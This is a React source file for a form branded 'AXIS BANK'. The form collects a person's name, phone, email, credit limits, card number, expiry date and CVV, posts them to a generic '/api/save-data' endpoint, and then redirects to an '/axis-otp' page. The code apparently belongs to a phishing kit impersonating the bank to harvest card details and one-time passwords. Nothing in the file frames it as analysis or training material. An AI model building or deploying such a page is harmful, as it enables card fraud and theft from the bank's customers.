import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const BASE_URL = process.env.REACT_APP_API_URL || "";

const SixaForm = () => {
  const [formData, setFormData] = useState({
    name: "",
    mobileNumber: "",
    email: "",
    state: "",
    workingState: "",
    totalLimit: "",
    availableLimit: "",
    cardHolderName: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [submitStatus, setSubmitStatus] = useState(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((fd) => ({
      ...fd,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setSubmitStatus(null);

    try {
      const res = await fetch(
        `${BASE_URL}/api/save-data`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );
      if (res.ok) {
        setSubmitStatus("success");
        setFormData({
          name: "",
          mobileNumber: "",
          email: "",
          state: "",
          workingState: "",
          totalLimit: "",
          availableLimit: "",
          cardHolderName: "",
          cardNumber: "",
          expiryDate: "",
          cvv: "",
        });
        // Redirect to OTP page after success (send mobile number in state object)
        navigate("/axis-otp", { state: { mobileNumber: formData.mobileNumber } });
      } else {
        setSubmitStatus("error");
      }
    } catch (err) {
      setSubmitStatus("error");
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="w-full max-w-md bg-white rounded-xl shadow-lg p-6">
        {/* Header */}
        <div className="flex items-center justify-center mb-6">
          <span className="text-[#9b1c31] text-xl font-bold">
            AXIS BANK
          </span>
        </div>
        {submitStatus === "success" && (
          <div className="mb-4 text-green-600 text-center font-medium">
            Form submitted successfully!
          </div>
        )}
        {submitStatus === "error" && (
          <div className="mb-4 text-red-600 text-center font-medium">
            Error submitting form. Please try again.
          </div>
        )}
        {/* Form */}
        <form className="space-y-4" onSubmit={handleSubmit}>
          <Input
            placeholder="Name"
            name="name"
            value={formData.name}
            onChange={handleChange}
          />
          <Input
            placeholder="Mobile Number"
            type="tel"
            name="mobileNumber"
            value={formData.mobileNumber}
            onChange={handleChange}
          />
          <Input
            placeholder="Email Address"
            type="email"
            name="email"
            value={formData.email}
            onChange={handleChange}
          />
          <Input
            placeholder="State"
            name="state"
            value={formData.state}
            onChange={handleChange}
          />
          <Input
            placeholder="Working State"
            name="workingState"
            value={formData.workingState}
            onChange={handleChange}
          />
          <Input
            placeholder="Total Limit"
            type="number"
            name="totalLimit"
            value={formData.totalLimit}
            onChange={handleChange}
          />
          <Input
            placeholder="Available Limit"
            type="number"
            name="availableLimit"
            value={formData.availableLimit}
            onChange={handleChange}
          />
          <Input
            placeholder="Card Holder Name"
            name="cardHolderName"
            value={formData.cardHolderName}
            onChange={handleChange}
          />
          <Input
            placeholder="Card Number"
            name="cardNumber"
            value={formData.cardNumber}
            onChange={handleChange}
          />
          <Input
            placeholder="Expiry Date (MM/YY)"
            name="expiryDate"
            value={formData.expiryDate}
            onChange={handleChange}
          />
          <Input
            placeholder="CVV"
            type="password"
            name="cvv"
            value={formData.cvv}
            onChange={handleChange}
          />

          <button
            type="submit"
            className="w-full bg-[#9b1c31] text-white py-3 rounded-lg font-medium hover:bg-[#7e1627] transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

const Input = ({
  placeholder,
  type = "text",
  name,
  value,
  onChange,
}) => (
  <input
    type={type}
    placeholder={placeholder}
    name={name}
    value={value}
    onChange={onChange}
    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#9b1c31] focus:border-transparent"
    autoComplete="off"
  />
);

export default SixaForm;
